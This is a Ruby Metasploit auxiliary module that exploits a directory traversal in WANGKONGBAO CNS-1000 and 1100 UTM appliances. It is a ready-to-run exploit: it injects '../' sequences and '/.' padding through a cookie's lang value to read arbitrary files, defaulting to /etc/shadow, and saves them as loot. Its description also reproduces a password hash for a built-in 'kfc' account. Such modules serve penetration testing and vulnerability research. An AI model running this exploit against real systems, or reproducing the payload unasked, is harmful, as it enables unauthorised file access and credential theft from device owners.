##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'WANGKONGBAO CNS-1000 and 1100 UTM Directory Traversal',
      'Description'    => %q{
          This module exploits the WANGKONGBAO CNS-1000 and 1100 UTM appliances aka
        Network Security Platform. This directory traversal vulnerability is interesting
        because the apache server is running as root, this means we can grab anything we
        want! For instance, the /etc/shadow and /etc/passwd files for the special
        kfc:$1$SlSyHd1a$PFZomnVnzaaj3Ei2v1ByC0:15488:0:99999:7::: user
      },
      'References'     =>
        [
          ['EDB', '19526']
        ],
      'Author'         =>
        [
          'Dillon Beresford'
        ],
      'License'        =>  MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(85),
        OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/shadow']),
        OptInt.new('DEPTH', [true, 'Traversal depth', 10])
      ], self.class)
  end

  def run_host(ip)
    # No point to continue if no filename is specified
    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
      print_error("Please supply the name of the file you want to download")
      return
    end

    travs = "../" * datastore['DEPTH']
    travs = travs[0,travs.rindex('/')]

    # Create request
    res = send_request_raw({
      'method' => 'GET',
      'uri'    => "/src/acloglogin.php",
      'headers' =>
        {
          'Connection' => "keep-alive",
          'Accept-Encoding' => "zip,deflate",
          'Cookie' => "PHPSESSID=af0402062689e5218a8bdad17d03f559; lang=owned" + travs + datastore['FILEPATH'] + "/."*4043
        },
    }, 25)

    print_status "File retreived successfully!"

    # Show data if needed
    if res and res.code == 200
      vprint_line(res.to_s)
      fname = File.basename(datastore['FILEPATH'])

      path = store_loot(
        'cns1000utm.http',
        'application/octet-stream',
        ip,
        res.body,
        fname
      )
      print_status("File saved in: #{path}")
    else
      print_error("Nothing was downloaded")
    end
  end
end
